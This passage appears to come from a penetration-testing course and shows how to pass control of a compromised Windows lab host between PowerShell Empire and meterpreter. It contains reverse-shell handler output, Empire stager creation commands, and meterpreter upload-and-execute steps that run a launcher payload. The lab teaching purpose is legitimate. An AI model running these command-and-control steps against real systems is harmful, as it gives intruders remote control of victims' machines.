```
[*] Agent $2YSXW1L returned results.
[*] Command execution completed.
[*] Valid results returned by 10.11.0.22
```

Listing 850 - Executing the meterpreter executable

With the executable running, we'll switch back to our meterpreter listener and watch the incoming shell:

```
[*] Started HTTP reverse handler on http://10.11.0.4:7777
[*] http://10.11.0.4:7777 handling request from 10.11.0.22; Staging x86 payload (18082
[*] Meterpreter session 1 opened (10.11.0.4:7777 -> 10.11.0.22:50597)

meterpreter>
```

Listing 851 - Meterpreter callback

Reversing this process to connect to an Empire agent from an existing meterpreter session is also simple. We can create a launcher (**bat** format) and use meterpreter to upload and execute it. First we'll create the launcher using Empire:

```
(Empire: listeners) > usestager windows/launcher_bat

(Empire: stager/windows/launcher_bat) > set Listener http

(Empire: stager/windows/launcher_bat) > execute

[*] Stager output written out to: /tmp/launcher.bat
```

Listing 852 - Creating the launcher

Then we can upload and execute it:

```
meterpreter > upload /tmp/launcher.bat
[*] Uploading : /tmp/launcher.bat -> launcher.bat
[*] Uploaded 4.69 KiB of 4.69 KiB (100.0%): /tmp/launcher.bat -> launcher.bat
[*] uploaded : /tmp/launcher.bat -> launcher.bat

meterpreter > shell
Process 4644 created.
Channel 2 created.

C:\Users\offsec.corp\Downloads>dir
dir

Volume in drive C has no label.
Volume Serial Number is 9E6A-47F8

Directory of C:\Users\offsec.corp\Downloads

09/19/2019 08:42 AM <DIR> .
09/19/2019 08:42 AM <DIR> ..
09/19/2019 08:42 AM 4,802 launcher.bat
        1 File(s) 4,802 bytes
        2 Dir(s) 2,922,359,040 bytes free

C:\Users\offsec.corp\Downloads>launcher.bat
launcher.bat
```

Listing 853 - Uploading and executing the launcher payload